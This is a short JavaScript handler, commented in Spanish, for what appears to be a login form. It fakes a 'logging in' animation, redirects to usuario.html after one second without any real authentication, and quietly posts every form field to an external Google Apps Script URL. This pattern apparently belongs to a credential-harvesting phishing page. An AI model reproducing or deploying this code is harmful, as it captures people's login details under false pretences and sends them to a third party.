document.getElementById("miFormulario").addEventListener("submit", function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener el botón y cambiar su texto a "Accediendo..."
    let boton = document.querySelector('button[type="submit"]');
    boton.textContent = "Accediendo";
    boton.classList.add("boton-cargando"); // Agregar animación de brillo
    boton.disabled = true; // Deshabilitar el botón

    // Efecto de puntos animados en el texto del botón
    let puntos = 0;
    let animacion = setInterval(() => {
        puntos = (puntos + 1) % 4; // Cambia entre 0, 1, 2, 3 puntos
        boton.textContent = "Accediendo" + ".".repeat(puntos);
    }, 500); // Cambia cada 0.5 segundos

    // Redirigir INMEDIATAMENTE sin esperar
    setTimeout(() => {
        clearInterval(animacion); // Detener animación antes de redirigir
        window.location.href = "usuario.html";
    }, 1000); // Redirigir después de 1 segundo

    // Enviar datos en segundo plano sin bloquear la redirección
    const formData = new FormData(this);
    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";

    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
